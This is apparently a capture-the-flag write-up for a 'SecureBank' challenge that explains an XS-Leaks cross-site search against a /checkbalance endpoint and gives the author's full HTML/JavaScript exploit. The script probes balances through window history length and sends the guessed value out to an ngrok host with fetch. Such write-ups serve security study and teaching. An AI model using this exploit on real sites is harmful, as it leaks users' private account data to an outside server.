### SecureBank XSS Search

This challenge required us to find out the account balance of the admin.

Looking carefully at the responses received from the web application, we would realise that the `/checkbalance` endpoint is vulnerable to a class of vulnerabilities known as [XS Leaks](https://xsleaks.dev).

If the queried amount is more than the actual balance in the user's account, the user is redirected. Otherwise, no redirection occurs. It would be possible to get the length of the window's history to check whether this redirection is occurred, allowing us to perform an "XS Search" on the user's account balance.

To obey the Same Origin Policy (SOP), we would need to do the following:

1. From the exploit server, open `http://10.8.201.87:5000/checkbalance?amount=${num}` as a new window.
2. Wait for the site to load. Depending on the balance, the window may be redirected to `/`.
3. Change the window's location back to the exploit server, so that both the original and new windows are of the same origin
4. We can now check the window's `history.length` attribute to determine if a redirect occurred in step 2.

After some trial and error, here's my final script.

```markup
<html>
    <body>
        <script>

            const sleep = (ms) => {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            const tryNumber = async (num) => {

                let opened = window.open(`http://10.8.201.87:5000/checkbalance?amount=${num}`);
                await sleep(2000);
                opened.location = "http://24cf-115-66-128-224.ngrok.io/nothing.txt";
                await sleep(2000);
                console.log(opened.history.length)
                if (opened.history.length === 3) {
                    return [false, num];
                }
                else {
                    return [true, num];
                }
            }

            (async () => {
                for (let i = 97280; i <= 97290; i+=1) {
                    tryNumber(i).then(res => {
                        let [success, guess] = res;
                        console.log(guess, success);
                        if (success === true) {fetch("http://24cf-115-66-128-224.ngrok.io/" + `${guess}`)}
                    })
                }
            })();
        </script>
    </body>
</html>
```

On line 25, I started with larger intervals, then slowly narrowed down the exact value by decreasing the interval range.
